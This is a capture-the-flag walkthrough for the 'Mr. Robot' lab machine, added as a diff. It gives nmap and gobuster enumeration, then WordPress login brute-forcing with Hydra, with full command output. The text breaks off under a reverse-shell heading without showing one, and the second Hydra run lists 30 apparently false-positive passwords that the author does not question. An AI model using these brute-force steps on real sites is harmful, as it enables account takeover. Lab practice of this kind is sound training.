@@ -1,0 +1,243 @@
+
+Mr. Robot CTF:
+
+Can you root this Mr. Robot styled machine? This is a virtual machine meant for beginners/intermediate users. There are 3 hidden keys located on the machine, can you find them?
+Credit to Leon Johnson for creating this machine.
+
+Lets start- we have following task to complete
+[Task 1] Connect to our network : 
+
+#1.1 	Connect to our network using OpenVPN. Here is a mini walkthrough of connecting: Connect the tryhackme network using openvpn conf file from access page.
+      1.1 task has been completed
+
+#1.2 	Use an OpenVPN client to connect. In my example I am on Linux, on the access page we have a windows tutorial.
+      connect the open vpn command:
+      kali@kali:~/Downloads$ sudo openvpn #########.ovpn
+      oputput will show you after successful connected vpn tunnel with THM network
+      Sun Jul 26 01:17:15 2020 Initialization Sequence Completed
+
+      1.2 task has been completed
+ 
+#1.3  You can verify you are connected by looking on your access page. Refresh the page
+      You see green tick next to Connected and show you your internal IP address.
+      
+[Task 2] Hack the machine 
+ first Deploy the machine using click on green color Deploy button.It will give you the Target machine IP Address.
+ in my case Target Machine IP Address is :10.10.185.102
+ 
+ Now ping the Target Machine IP Address to check connectivity and machine deployement.
+ kali@kali:~$ ping 10.10.185.102
+ PING 10.10.185.102 (10.10.185.102) 56(84) bytes of data.
+ 64 bytes from 10.10.185.102: icmp_seq=1 ttl=61 time=745 ms
+ -------------------------------------------------------------------------------------------------------------------------------------------------
+ #2.1  What is key 1?
+ 
+ INFORMATION GATHERING
+ 
+ #############
+ Using NMAP:
+ #############
+ 
+ NMAP Scan: to determine open ports on the Target machine and running services over the opened ports.
+ command:
+ kali@kali:~$ sudo nmap -T4-v -sV -sC  -A 10.10.185.102
+ Have a cup of tea...it will take little more time to finish the scanning.
+ NMAP scanning output-
+ 
+ PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+| http-methods: 
+|_  Supported Methods: GET HEAD POST
+|_http-server-header: Apache
+|_http-title: 400 Bad Request
+| ssl-cert: Subject: commonName=www.example.com
+| Issuer: commonName=www.example.com
+| Public Key type: rsa
+| Public Key bits: 1024
+| Signature Algorithm: sha1WithRSAEncryption
+| Not valid before: 2015-09-16T10:45:03
+| Not valid after:  2025-09-13T10:45:03
+| MD5:   3c16 3b19 87c3 42ad 6634 c1c9 d0aa fb97
+|_SHA-1: ef0c 5fa5 931a 09a5 687c a2c2 80c4 c792 07ce f71b
+Device type: general purpose|specialized|storage-misc|broadband router|printer|WAP
+
+
+Opened ports are 
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+443/tcp open   ssl/http Apache httpd
+
+after that, browse the http:// 10.10.185.102, and its not useful to us to lead us.
+
+we would like to enumerate the directories of the website to fetch some information such as login page, admin portal, and etc exist or not.
+
+##############
+Using Gobuster:
+##############
+  Run gobuster scanning to find hidden files and directories.
+  
+kali@kali:~$ gobuster dir -u 10.10.185.102 -w /usr/share/dirb/wordlists/common.txt
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.185.102
+[+] Threads:        10
+[+] Wordlist:       /usr/share/dirb/wordlists/common.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2020/07/26 05:04:59 Starting gobuster
+===============================================================
+/.hta (Status: 403)
+/.htaccess (Status: 403)
+/.htpasswd (Status: 403)
+/0 (Status: 301)
+/admin (Status: 301)
+/atom (Status: 301)
+/audio (Status: 301)
+/blog (Status: 301)
+/css (Status: 301)
+/dashboard (Status: 302)
+/favicon.ico (Status: 200)
+/feed (Status: 301)
+/image (Status: 301)
+/images (Status: 301)
+/Image (Status: 301)
+/index.html (Status: 200)
+/index.php (Status: 301)
+/intro (Status: 200)
+/js (Status: 301)
+/license (Status: 200)
+/login (Status: 302)
+/page1 (Status: 301)
+/phpmyadmin (Status: 403)
+/rdf (Status: 301)
+/readme (Status: 200)
+/robots (Status: 200)
+/robots.txt (Status: 200)
+/rss (Status: 301)
+/rss2 (Status: 301)
+/wp-admin (Status: 301)
+/wp-content (Status: 301)
+/wp-config (Status: 200)
+/wp-includes (Status: 301)
+/wp-cron (Status: 200)
+/wp-links-opml (Status: 200)
+/wp-load (Status: 200)
+/wp-login (Status: 200)
+/wp-signup (Status: 302)
+
+ Now Check All the Status code:200.Browse each
+ 
+ /intro (Status: 200)          Nothing Helpful
+ /license (Status: 200)        Nothing Helpful
+ /readme (Status: 200)         Nothing Helpful
+ /robots (Status: 200)         Nothing Helpful
+ /robots.txt (Status: 200)     Something Juicy in this directory
+ /wp-login (Status: 200)    useful to login
+ #########
+ http://10.10.185.102/robots.txt
+ Output:
+    User-agent: *
+    fsocity.dic
+    key-1-of-3.txt
+  ##########
+ Opening http://10.10.185.102/key-1–of-3.txt
+ It will give us our first Key1.
+ 
+  ###########
+  
+ Now lets take fsociety.dic
+  Opening http://10.10.185.102/fsocity.dic and download list
+  now open the fsocity.dic
+  
+  kali@kali:~/Downloads$ cat fsocity.dic 
+  its a wordlist, which might be useful for further process.
+  
+  ########################
+  Getting a reverse shell
+  ########################
+  
+  go to the wp-login page : http://10.10.185.102/wp-login
+  open the burpsuit and set proxy intercept on.
+  browse http://10.10.185.102/wp-login
+  insert username and password as test
+  
+  burpsuit intercept following way to login.burp to see the POST parameter used
+  log=test&pwd=test&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.185.102%2Fwp-admin%2F&testcookie=1
+  
+  from ouput "log"   and "pwd"
+  #################
+  Perform dictionary attack using Hydra to find username and password
+  ****
+  kali@kali:~/Downloads$ sudo hydra -L fsocity.dic -p test 10.10.185.102 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+  Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+  Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-07-26 06:45:26
+  [DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:858235/p:1), ~28608 tries per task
+  [DATA] attacking http-post-form://10.10.185.102:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
+  [80][http-post-form] host: 10.10.185.102   login: Elliot   password: test
+  [STATUS] 791.00 tries/min, 791 tries in 00:01h, 857444 to do in 18:05h, 30 active
+  [80][http-post-form] host: 10.10.185.102   login: elliot   password: test
+  [STATUS] 797.00 tries/min, 2391 tries in 00:03h, 855844 to do in 17:54h, 30 active
+
+  We get username as Elliot.Let’s try to login with Elliot:test
+  We get error: The password you entered for the username Elliot is incorrect.
+  means username correct.
+  
+  Now we got our username:Elliot use it and fire hydra again
+  *****
+  kali@kali:~/Downloads$ sudo hydra -l Elliot -P fsocity.dic  10.10.185.102 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30
+
+ [DATA] max 30 tasks per 1 server, overall 30 tasks, 858235 login tries (l:1/p:858235), ~28608 tries per task
+[DATA] attacking http-post-form://10.10.185.102:80/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: extensions
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: wikia
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: from
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: var
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: Wikia
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: false
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: null
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: page
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: Elliot
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: now
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: com
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: ago
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: chat
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: eps1
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: user
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: images
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: net
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: Special
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: styles
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: function
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: GlobalNavigation
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: Robot
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: http
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: and
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: scss
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: window
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: document
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: true
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: mrrobot
+[80][http-post-form] host: 10.10.185.102   login: Elliot   password: the
+1 of 1 target successfully completed, 30 valid passwords found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-07-26 07:03:51
+kali@kali:~/Downloads$ 
+
+
+
+
+
+ 
+ 
